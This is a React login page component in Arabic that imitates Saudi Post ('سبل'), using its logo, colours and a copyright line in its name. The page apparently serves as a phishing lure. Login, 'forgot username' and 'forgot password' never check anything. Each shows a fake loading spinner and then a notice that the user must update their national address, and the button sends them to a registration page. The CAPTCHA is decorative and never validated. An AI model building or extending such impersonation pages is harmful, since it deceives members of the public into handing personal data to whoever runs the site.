import { useState, useEffect } from "react";
import { Link, useLocation } from "wouter";

export default function Login() {
  const [, setLocation] = useLocation();
  const [accountType, setAccountType] = useState("individuals");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [captchaInput, setCaptchaInput] = useState("");
  const [captchaCode, setCaptchaCode] = useState("");
  
  // Loading and message states
  const [isLoading, setIsLoading] = useState(false);
  const [showMessage, setShowMessage] = useState(false);

  // Generate random CAPTCHA
  const generateCaptcha = () => {
    const chars = "0123456789";
    let code = "";
    for (let i = 0; i < 4; i++) {
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    setCaptchaCode(code);
  };

  useEffect(() => {
    generateCaptcha();
  }, []);

  // Handle action with loading and message
  const handleActionWithLoading = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setShowMessage(true);
    }, 3000);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleActionWithLoading();
  };

  const handleForgotUsername = (e: React.MouseEvent) => {
    e.preventDefault();
    handleActionWithLoading();
  };

  const handleForgotPassword = (e: React.MouseEvent) => {
    e.preventDefault();
    handleActionWithLoading();
  };

  const handleContinue = () => {
    setShowMessage(false);
    setLocation('/register');
  };

  return (
    <div className="min-h-screen bg-gray-100" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
      {/* Loading Overlay */}
      {isLoading && (
        <div className="fixed inset-0 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-8 flex flex-col items-center gap-4 shadow-lg">
            <div className="w-12 h-12 border-4 border-[#04ccf0] border-t-transparent rounded-full animate-spin"></div>
            <p className="text-gray-700 font-medium">جاري التحميل...</p>
          </div>
        </div>
      )}

      {/* Message Modal */}
      {showMessage && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-8 max-w-md mx-4 text-center">
            <div className="mb-6">
              <svg className="w-16 h-16 mx-auto text-[#146c84]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
            <p className="text-lg font-bold text-[#143c3c] mb-6">
              عليك تحديث بيانات عنوانك الوطني للإستفادة من الخدمات
            </p>
            <button
              onClick={handleContinue}
              className="px-12 py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors"
            >
              متابعة
            </button>
          </div>
        </div>
      )}

      {/* Header - dark green bar with English on left */}
      <header className="bg-[#143c3c] py-2">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            {/* Empty space on right */}
            <div></div>
            {/* English on left */}
            <a href="#" className="text-white text-sm hover:text-gray-300">English</a>
          </div>
        </div>
      </header>

      {/* Line below header */}
      <div className="h-2 bg-[#146c84]"></div>

      {/* Logo and Register button below header */}
      <div className="bg-gray-100 py-4">
        <div className="container mx-auto px-4">
          <div className="max-w-xl mx-auto flex justify-between items-center">
            {/* Logo on right */}
            <Link to="/">
              <img src="/images/spl-logo.png" alt="سبل" className="h-14 md:h-16 w-auto" />
            </Link>
            {/* Register button on left */}
            <Link to="/register">
              <button className="px-6 py-2 border-2 border-[#146c84] text-[#146c84] bg-white font-medium rounded hover:bg-[#146c84] hover:text-white transition-colors">
                تسجيل
              </button>
            </Link>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-8 md:py-12">
        <div className="max-w-xl mx-auto">
          {/* White Box Container */}
          <div className="bg-white rounded-lg shadow-lg p-6 md:p-10">
            {/* Title */}
            <h1 className="text-2xl md:text-3xl font-bold text-[#143c3c] text-right mb-6 md:mb-8">
              تسجيل الدخول
            </h1>

            {/* Account Type Selection */}
            <div className="mb-6 md:mb-8">
              <h2 className="text-lg md:text-xl font-semibold text-gray-800 text-right mb-4 md:mb-6">
                الرجاء اختيار نوع الحساب
              </h2>

              <div className="space-y-3 md:space-y-4">
                {/* الأفراد */}
                <label className="flex items-center gap-2 cursor-pointer">
                  <div className="relative">
                    <input
                      type="radio"
                      name="accountType"
                      value="individuals"
                      checked={accountType === "individuals"}
                      onChange={(e) => setAccountType(e.target.value)}
                      className="sr-only"
                    />
                    <div className={`w-5 h-5 rounded-full border-2 ${accountType === "individuals" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                      {accountType === "individuals" && (
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      )}
                    </div>
                  </div>
                  <span className="text-gray-700 text-sm md:text-base">الأفراد</span>
                </label>

                {/* الأعمال */}
                <label className="flex items-center gap-2 cursor-pointer">
                  <div className="relative">
                    <input
                      type="radio"
                      name="accountType"
                      value="business"
                      checked={accountType === "business"}
                      onChange={(e) => setAccountType(e.target.value)}
                      className="sr-only"
                    />
                    <div className={`w-5 h-5 rounded-full border-2 ${accountType === "business" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                      {accountType === "business" && (
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      )}
                    </div>
                  </div>
                  <span className="text-gray-700 text-sm md:text-base">الاعمال</span>
                </label>

                {/* الخدمات الحكومية */}
                <label className="flex items-center gap-2 cursor-pointer">
                  <div className="relative">
                    <input
                      type="radio"
                      name="accountType"
                      value="government"
                      checked={accountType === "government"}
                      onChange={(e) => setAccountType(e.target.value)}
                      className="sr-only"
                    />
                    <div className={`w-5 h-5 rounded-full border-2 ${accountType === "government" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                      {accountType === "government" && (
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      )}
                    </div>
                  </div>
                  <span className="text-gray-700 text-sm md:text-base">الخدمات الحكومية</span>
                </label>
              </div>
            </div>

            {/* Login Form */}
            <form onSubmit={handleSubmit}>
              <h3 className="text-lg md:text-xl font-semibold text-gray-800 text-right mb-4 md:mb-6">
                بيانات التسجيل
              </h3>

              {/* Username Field */}
              <div className="mb-4">
                <input
                  type="text"
                  placeholder={accountType === "business" ? "اسم المستخدم / رقم الرخصة / السجل التجاري / الرقم الموحد" : accountType === "government" ? "اسم المستخدم" : "اسم المستخدم / رقم الهوية / رقم الإقامة"}
                  value={username}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^a-zA-Z0-9]/g, '');
                    setUsername(value);
                  }}
                  className="w-full px-4 py-[11px] border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
                />
              </div>

              {/* Password Field */}
              <div className="mb-4">
                <input
                  type="password"
                  placeholder="كلمة المرور"
                  value={password}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g, '');
                    setPassword(value);
                  }}
                  className="w-full px-4 py-[11px] border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
                />
              </div>

              {/* CAPTCHA */}
              <div className="mb-6 flex items-center gap-3">
                {/* CAPTCHA Input - Right side in RTL */}
                <input
                  type="text"
                  placeholder="الرمز المرئي"
                  value={captchaInput}
                  onChange={(e) => setCaptchaInput(e.target.value)}
                  className="flex-1 px-4 py-[11px] border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
                />

                {/* CAPTCHA Display - Left side in RTL */}
                <div className="bg-gray-100 border border-gray-300 rounded-lg px-4 py-[11px] min-w-[100px] text-center">
                  <span 
                    className="text-base font-bold text-gray-700 select-none"
                    style={{ 
                      fontFamily: "monospace",
                      letterSpacing: "3px",
                      textDecoration: "line-through",
                      fontStyle: "italic"
                    }}
                  >
                    {captchaCode}
                  </span>
                </div>

                {/* Refresh Button - Left side in RTL */}
                <button
                  type="button"
                  onClick={generateCaptcha}
                  className="bg-gray-100 border border-gray-300 rounded-lg p-[11px] hover:bg-gray-200 transition-colors"
                >
                  <svg className="w-5 h-5 md:w-6 md:h-6 text-[#04ccf0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                  </svg>
                </button>
              </div>

              {/* Submit Button */}
              <div>
                <button
                  type="submit"
                  className="px-12 md:px-16 py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
                >
                  تسجيل الدخول
                </button>
              </div>

              {/* Forgot Links */}
              <div className="flex flex-col md:flex-row items-start md:items-center gap-4 md:gap-8 mt-6">
                <a 
                  href="#" 
                  onClick={handleForgotUsername}
                  className="flex items-center gap-2 text-[#146c84] hover:text-[#0d4a5c] text-sm md:text-base"
                >
                  نسيت اسم المستخدم
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                  </svg>
                </a>
                <a 
                  href="#" 
                  onClick={handleForgotPassword}
                  className="flex items-center gap-2 text-[#146c84] hover:text-[#0d4a5c] text-sm md:text-base"
                >
                  نسيت كلمة المرور
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                  </svg>
                </a>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#143c3c] py-5">
        <div className="container mx-auto px-4">
          <div className="flex flex-col md:flex-row items-center justify-between text-white text-sm">
            {/* Right side - Copyright */}
            <div className="flex items-center gap-1 mb-2 md:mb-0">
              <span>©</span>
              <span>2026 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُبل</span>
            </div>
            
            {/* Left side - Terms and Privacy */}
            <div className="flex items-center gap-1">
              <span className="text-gray-300">عند استخدامك هذا الموقع، فإنك توافق على</span>
              <a href="#" className="text-[#04ccf0] hover:underline">شروط الخدمة</a>
              <span className="text-gray-300">و</span>
              <a href="#" className="text-[#04ccf0] hover:underline">سياسة الخصوصية</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
